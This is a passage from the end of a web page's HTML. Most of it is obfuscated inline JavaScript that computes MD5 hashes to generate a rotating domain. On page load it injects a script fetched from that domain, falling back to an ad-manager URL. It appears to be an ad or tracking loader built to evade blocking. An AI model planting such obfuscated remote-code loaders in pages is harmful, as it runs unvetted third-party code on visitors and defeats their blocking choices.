Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>